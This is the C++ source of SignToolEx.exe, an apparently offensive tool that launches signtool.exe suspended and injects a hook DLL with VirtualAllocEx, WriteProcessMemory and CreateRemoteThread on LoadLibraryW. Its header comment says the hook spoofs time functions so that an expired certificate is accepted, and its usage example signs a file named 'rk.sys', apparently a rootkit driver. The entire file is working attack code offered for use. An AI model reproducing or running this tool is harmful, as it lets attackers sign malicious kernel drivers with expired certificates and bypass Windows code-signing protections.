/* SignToolEx.exe
*  ==============
*  This is a wrapper around signtool.exe that will inject SignToolEx.dll
*  into the process to hook the time related functions and spoof an expired
*  certificate as being valid using detours. Args passed to signtool.exe so
*  use like "SignToolEx.exe sign /v /f cert.pfx /p pw /fd SHA256 rk.sys".
*  
*  -- HF @ https://hacker.house
*/
#include <windows.h>
#include <string>

int main(int argc, char* argv[]) {
    std::string cmdLine = "signtool.exe";
    // Append all command line arguments
    for (int i = 1; i < argc; i++) {
        cmdLine += " ";
        cmdLine += argv[i];
    }
    // Convert command line to wide string
    std::wstring wcmdLine(cmdLine.begin(), cmdLine.end());
    // Prepare CreateProcess parameters
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    // Start the child process with suspended main thread
    if (!CreateProcessW(NULL, &wcmdLine[0], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return 1;
    }
    // Get the full path of the DLL
    wchar_t dllPath[MAX_PATH];
    if (!GetFullPathNameW(L"SignToolExHook.dll", MAX_PATH, dllPath, NULL)) {
        printf("GetFullPathNameW failed (%d).\n", GetLastError());
        return 1;
    }
    // Allocate memory in the child process to store the DLL path
    LPVOID remoteDllPath = VirtualAllocEx(pi.hProcess, NULL, sizeof(dllPath), MEM_COMMIT, PAGE_READWRITE);
    if (!remoteDllPath) {
        printf("VirtualAllocEx failed (%d).\n", GetLastError());
        return 1;
    }
    if (!WriteProcessMemory(pi.hProcess, remoteDllPath, dllPath, sizeof(dllPath), NULL)) {
        printf("WriteProcessMemory failed (%d).\n", GetLastError());
        return 1;
    }
    // Get the address of LoadLibraryW in kernel32.dll
    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    if (!loadLibraryAddr) {
        printf("GetProcAddress failed (%d).\n", GetLastError());
        return 1;
    }
    // Create a remote thread that calls LoadLibraryW with the DLL path as parameter
    HANDLE remoteThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, remoteDllPath, 0, NULL);
    if (!remoteThread) {
        printf("CreateRemoteThread failed (%d).\n", GetLastError());
        return 1;
    }
    // Wait for the remote thread to finish
    DWORD waitResult = WaitForSingleObject(remoteThread, INFINITE);
    if (waitResult != WAIT_OBJECT_0) {
        printf("WaitForSingleObject failed (%d).\n", GetLastError());
        return 1;
    }
    // Clean up
    VirtualFreeEx(pi.hProcess, remoteDllPath, sizeof(dllPath), MEM_RELEASE);
    CloseHandle(remoteThread);
    // Resume the main thread
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        printf("ResumeThread failed (%d).\n", GetLastError());
        return 1;
    }
    // Wait for the child process to exit
    waitResult = WaitForSingleObject(pi.hProcess, INFINITE);
    if (waitResult != WAIT_OBJECT_0) {
        printf("WaitForSingleObject failed (%d).\n", GetLastError());
        return 1;
    }
    // Close process and thread handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}